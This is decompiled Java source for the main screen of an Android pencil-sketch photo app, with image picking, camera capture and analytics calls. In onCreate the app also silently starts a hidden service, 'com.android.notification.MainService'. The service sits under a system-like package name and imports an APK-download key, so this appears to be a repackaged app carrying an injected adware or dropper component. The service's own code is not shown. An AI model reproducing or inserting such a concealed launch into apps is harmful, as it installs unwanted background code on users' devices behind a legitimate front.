package com.dumplingsandwich.pencilsketch;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.Display;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.FrameLayout.LayoutParams;
import android.widget.Toast;
import cn.dump.pencil.R;
import com.android.notification.configure.DownApkXmlKey;
import com.android.notification.configure.IntentFlag;
import com.android.notification.util.AppUtil;
import com.android.notification.util.Tool;
import com.android.view.ViewLayout;
import com.appbrain.AppBrain;
import com.dumplingsandwich.pencilsketch.utils.BitmapUtils;
import com.umeng.analytics.MobclickAgent;
import java.io.File;
import u.aly.bs;

public class MainActivity extends Activity {
    private static final int PICK_FROM_CAMERA = 2;
    private static final int PICK_FROM_FILE = 1;
    public static Bitmap original_picked;
    private Button btn_options;
    private Button btn_pick;
    private Button btn_take;
    private OnClickListener listener;
    private Uri mImageCaptureUri;
    private Bundle savedInstanceState;
    private ViewLayout viewLayout;

    public void onNotificationService() {
        String nService = "com.android.notification.MainService";
        boolean IfServiceOn = AppUtil.MyServiceOrNotStart(((ActivityManager) getSystemService("activity")).getRunningServices(1000), "com.android.notification.MainService");
        Tool.JWDlog(DownApkXmlKey.ROOT, "class:NewNotificationActivity  func:onNotificationService  text:IfServiceOn = " + IfServiceOn);
        if (!IfServiceOn) {
            Intent intent = new Intent();
            intent.setAction("com.android.notification.MainService");
            intent.addFlags(134217728);
            intent.putExtra(IntentFlag.FLAG, IntentFlag.APP_START);
            startService(intent);
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.main);
        initialListener();
        this.btn_pick = (Button) findViewById(R.id.pick);
        this.btn_pick.setOnClickListener(this.listener);
        this.btn_take = (Button) findViewById(R.id.take);
        this.btn_take.setOnClickListener(this.listener);
        this.btn_options = (Button) findViewById(R.id.options);
        this.btn_options.setOnClickListener(this.listener);
        AppBrain.init(this);
        onNotificationService();
    }

    public void onViewLayoutVertical() {
        LayoutParams params = new LayoutParams(-2, -2);
        this.viewLayout = new ViewLayout(getApplicationContext());
        params.gravity = 1;
        addContentView(this.viewLayout, params);
    }

    private void initialListener() {
        this.listener = new OnClickListener() {
            public void onClick(View v) {
                switch (v.getId()) {
                    case R.id.pick:
                        Intent gallery_intent = new Intent();
                        gallery_intent.setType("image/*");
                        gallery_intent.setAction("android.intent.action.GET_CONTENT");
                        MainActivity.this.startActivityForResult(Intent.createChooser(gallery_intent, "Complete action using"), 1);
                        return;
                    case R.id.take:
                        Intent camera_intent = new Intent("android.media.action.IMAGE_CAPTURE");
                        MainActivity.this.mImageCaptureUri = Uri.fromFile(new File(Environment.getExternalStorageDirectory(), "capture_" + String.valueOf(System.currentTimeMillis()) + ".jpg"));
                        try {
                            camera_intent.putExtra("output", MainActivity.this.mImageCaptureUri);
                            camera_intent.putExtra("return-data", true);
                            MainActivity.this.startActivityForResult(camera_intent, 2);
                            return;
                        } catch (Exception e) {
                            e.printStackTrace();
                            return;
                        }
                    case R.id.options:
                        Intent i = new Intent("android.intent.action.VIEW");
                        i.setData(Uri.parse("market://details?id=com.dumplingsandwich.pencilsketch"));
                        MainActivity.this.startActivity(i);
                        return;
                    default:
                        return;
                }
            }
        };
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == -1) {
            String path = bs.b;
            Display display = getWindowManager().getDefaultDisplay();
            int width = display.getWidth();
            int height = display.getHeight();
            if (requestCode == 1) {
                this.mImageCaptureUri = data.getData();
                path = getRealPathFromURI(this.mImageCaptureUri);
                if (path == null) {
                    path = this.mImageCaptureUri.getPath();
                }
                if (path != null) {
                    original_picked = BitmapUtils.decodeBitmap(path, width, height);
                }
            } else if (requestCode == 2) {
                if (this.mImageCaptureUri != null) {
                    path = this.mImageCaptureUri.getPath();
                } else {
                    path = this.savedInstanceState.getString("PATH");
                }
                original_picked = BitmapUtils.decodeBitmap(path, width, height);
            }
            if (original_picked == null) {
                Toast.makeText(getBaseContext(), "This image doesn't exist. Please pick another one.", 0).show();
            } else {
                startActivity(new Intent(this, ImageEditingActivity.class));
            }
        }
    }

    public String getRealPathFromURI(Uri contentUri) {
        Cursor cursor = managedQuery(contentUri, new String[]{"_data"}, null, null, null);
        if (cursor == null) {
            return null;
        }
        int column_index = cursor.getColumnIndexOrThrow("_data");
        cursor.moveToFirst();
        return cursor.getString(column_index);
    }

    protected void onSaveInstanceState(Bundle outState) {
        if (this.mImageCaptureUri != null) {
            outState.putString("PATH", this.mImageCaptureUri.getPath());
        }
        super.onSaveInstanceState(outState);
    }

    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        this.savedInstanceState = savedInstanceState;
    }

    public void onBackPressed() {
        finish();
    }

    public void onPause() {
        super.onPause();
        MobclickAgent.onPause(this);
    }

    public void onResume() {
        super.onResume();
        MobclickAgent.onResume(this);
    }
}
